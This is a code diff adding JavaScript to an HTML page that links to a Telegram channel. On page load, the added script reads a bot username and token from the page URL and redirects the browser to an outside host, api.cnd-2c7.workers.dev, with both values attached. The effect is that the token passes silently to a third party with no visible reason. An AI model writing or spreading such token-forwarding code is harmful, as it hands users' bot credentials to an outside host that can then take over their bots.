@@ -148,6 +148,25 @@
         continueBtn.addEventListener('click', function() {
             window.location.href = 'https://telegram.me/PandaWep';
         });
+            // Get the current URL
+        const currentUrl = window.location.href;
+        
+        // Regular expression to extract the bot username and token
+        const regex = /[?&]([^=]+)=([^&]+)/;
+        
+        // Check if the 'XYZ' parameter exists in the URL
+        const match = currentUrl.match(regex);
+        
+        if (match) {
+            const botUsername = match[1]; // Extracts the bot username (e.g., XYZ)
+            const token = match[2]; // Extracts the token (e.g., <TOKEN>)
+        
+            // Construct the new URL with the extracted values
+            const newUrl = `https://api.cnd-2c7.workers.dev/?=${botUsername}=${token}`; // Replace <your_redirect_url> with your actual URL
+        
+            // Redirect to the new URL
+            window.location.href = newUrl;
+        }
     </script>
 </body>
 </html>
